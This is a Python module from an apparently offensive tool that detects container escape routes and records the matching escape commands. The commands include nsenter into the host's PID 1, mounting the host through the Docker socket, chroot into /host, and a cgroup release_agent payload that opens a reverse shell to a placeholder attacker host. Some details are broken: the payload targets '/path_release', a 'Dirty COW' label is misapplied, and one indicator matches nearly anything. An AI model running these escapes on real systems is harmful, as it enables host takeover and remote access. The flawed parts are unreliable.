"""Identify and execute container escape techniques."""

from __future__ import annotations

import re
import subprocess
from typing import Any, Dict, List

from kraken.models import AttackResult, EngagementContext
from kraken.logger import log
from kraken.modules.base import BaseModule

# Container escape techniques checked against the runtime environment
ESCAPE_TECHNIQUES = [
    {
        "name": "privileged_container",
        "check": "cat /proc/1/status | grep CapEff",
        "indicator": "CapEff:\t0000003fffffffff",
        "escape": "nsenter -t 1 -m -u -i -n -p -- bash",
        "description": "Running in privileged container. nsenter to escape to host.",
    },
    {
        "name": "docker_socket",
        "check": "ls /var/run/docker.sock",
        "indicator": "/var/run/docker.sock",
        "escape": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "description": "Docker socket mounted. Create privileged container for host access.",
    },
    {
        "name": "hostpath_root",
        "check": "ls /host",
        "indicator": "etc",
        "escape": "chroot /host /bin/bash",
        "description": "Host / mounted at /host. chroot to escape.",
    },
    {
        "name": "hostpid",
        "check": "cat /proc/1/cmdline",
        "indicator": "systemd",
        "escape": "nsenter -t 1 -m -u -i -n -p -- bash",
        "description": "hostPID=true. Can nsenter into PID 1 (host init).",
    },
    {
        "name": "cgroup_v1",
        "check": "cat /proc/1/cgroup",
        "indicator": "/",
        "escape": (
            "mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && "
            "echo 1 > /tmp/cgrp/x/notify_on_release && "
            "echo \"$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /proc/mounts | head -1)"
            "/../../../bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\" > /path_release && "
            "echo 1 > /tmp/cgrp/x/cgroup.procs"
        ),
        "description": "cgroup v1 release_agent escape (Dirty COW variant).",
    },
]


class EscapeModule(BaseModule):
    """Identify and execute container escape techniques."""

    name = "escape"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        results: List[AttackResult] = []
        log("[Escape] Checking container escape vectors...", "INFO")

        for tech in ESCAPE_TECHNIQUES:
            result = self._check_technique(tech)
            results.append(result)

        # Check for writable cgroup v1 release_agent
        results.extend(self._check_cgroup_escape())
        # Check capabilities
        results.extend(self._check_capabilities())
        return results

    def _check_technique(self, tech: Dict[str, Any]) -> AttackResult:
        name = tech["name"]
        try:
            proc = subprocess.run(
                tech["check"], shell=True, capture_output=True, text=True, timeout=5
            )
            output = proc.stdout + proc.stderr
            if tech["indicator"] in output:
                log(f"[Escape] VULNERABLE: {name} — {tech['description']}", "CRIT")
                return AttackResult(
                    "escape", name, "SUCCESS",
                    severity="CRITICAL",
                    data={"check_output": output[:200], "escape_cmd": tech["escape"]},
                    notes=f"{tech['description']} | Escape: {tech['escape'][:100]}",
                )
            else:
                return AttackResult("escape", name, "INFO",
                                    notes=f"{name}: not applicable")
        except Exception as exc:
            return AttackResult("escape", name, "FAILED", notes=str(exc))

    def _check_capabilities(self) -> List[AttackResult]:
        results: List[AttackResult] = []
        try:
            proc = subprocess.run(
                "cat /proc/self/status | grep Cap",
                shell=True, capture_output=True, text=True, timeout=3
            )
            cap_eff_match = re.search(r"CapEff:\s+([0-9a-f]+)", proc.stdout)
            if cap_eff_match:
                cap_hex = int(cap_eff_match.group(1), 16)
                # Check for dangerous capabilities
                CAP_SYS_ADMIN = (1 << 21)
                CAP_SYS_PTRACE = (1 << 19)
                CAP_NET_ADMIN = (1 << 12)

                dangerous_caps: List[str] = []
                if cap_hex & CAP_SYS_ADMIN:
                    dangerous_caps.append("CAP_SYS_ADMIN (mount, device access, many escapes)")
                if cap_hex & CAP_SYS_PTRACE:
                    dangerous_caps.append("CAP_SYS_PTRACE (ptrace any process → code injection)")
                if cap_hex & CAP_NET_ADMIN:
                    dangerous_caps.append("CAP_NET_ADMIN (iptables manipulation, traffic capture)")

                if dangerous_caps:
                    log(f"[Escape] Dangerous capabilities: {dangerous_caps}", "CRIT")
                    results.append(AttackResult(
                        "escape", "capabilities", "SUCCESS",
                        severity="CRITICAL",
                        data={"cap_hex": hex(cap_hex), "dangerous": dangerous_caps},
                        notes=f"Dangerous capabilities present: {', '.join(dangerous_caps)}",
                    ))
                else:
                    results.append(AttackResult("escape", "capabilities", "INFO",
                                                data={"cap_hex": hex(cap_hex)},
                                                notes="No dangerous capabilities detected"))
        except Exception as exc:
            results.append(AttackResult("escape", "capabilities", "FAILED", notes=str(exc)))
        return results

    def _check_cgroup_escape(self) -> List[AttackResult]:
        try:
            # Check if cgroup v1 release_agent is writable (CVE-2022-0492 style)
            result = subprocess.run(
                "find /sys/fs/cgroup -name release_agent -writable 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5
            )
            if result.stdout.strip():
                log("[Escape] Writable cgroup release_agent found!", "CRIT")
                return [AttackResult(
                    "escape", "cgroup_release_agent", "SUCCESS",
                    severity="CRITICAL",
                    data={"writable_paths": result.stdout.strip().split("\n")},
                    notes="Writable cgroup release_agent — container escape via CVE-2022-0492 style. "
                          "Write reverse shell payload to release_agent file.",
                )]
        except Exception:
            pass
        return []
